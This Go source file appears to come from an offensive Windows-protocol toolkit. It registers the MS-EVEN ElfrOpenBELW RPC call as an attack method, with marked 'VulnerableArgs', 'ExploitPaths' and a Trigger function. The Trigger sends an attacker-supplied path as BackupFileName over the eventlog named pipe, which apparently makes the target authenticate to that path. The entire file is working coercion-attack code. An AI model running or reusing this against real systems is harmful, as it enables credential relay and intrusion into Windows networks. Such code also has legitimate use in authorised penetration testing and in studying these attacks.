package methods

import (
	"math/rand"

	eventlog "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/82273fdc-e32a-18c3-3f78-827929dc23ea/0.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	msdtyp "github.com/TheManticoreProject/Manticore/windows/ms-dtyp"
	mseven "github.com/TheManticoreProject/Manticore/windows/protocols/ms-even"
)

// --- Op 9: ElfrOpenBELW ---

type elfrOpenBELWRequest struct {
	UNCServerName  ndr.WSTR `ndr:"unique"`
	BackupFileName msdtyp.RPC_UNICODE_STRING
	MajorVersion   ndr.DWORD
	MinorVersion   ndr.DWORD
}

func (*elfrOpenBELWRequest) Opnum() uint16 { return eventlog.OpnumElfrOpenBELW }

type elfrOpenBELWResponse struct {
	LogHandle mseven.IELF_HANDLE
	Status    ndr.DWORD `ndr:"retval"`
}

func evenAccess() []Access {
	syntaxes := []syntax.SyntaxID{eventlog.SyntaxID()}
	return []Access{
		{Transport: TransportNamedPipe, Pipe: eventlog.PipeName, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
	}
}

func registerEVEN(r *Registry) {
	access := evenAccess()
	paths := evenPaths()

	r.Register(Method{
		Protocol: "MS-EVEN", ProtocolLong: "EventLog Remoting",
		Function: "ElfrOpenBELW", Opnum: eventlog.OpnumElfrOpenBELW,
		VulnerableArgs: []string{"BackupFileName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			req := &elfrOpenBELWRequest{
				BackupFileName: msdtyp.NewUnicodeString(exploitPath),
				MajorVersion:   ndr.DWORD(rand.Intn(100)),
				MinorVersion:   ndr.DWORD(rand.Intn(100)),
			}
			var resp elfrOpenBELWResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})
}
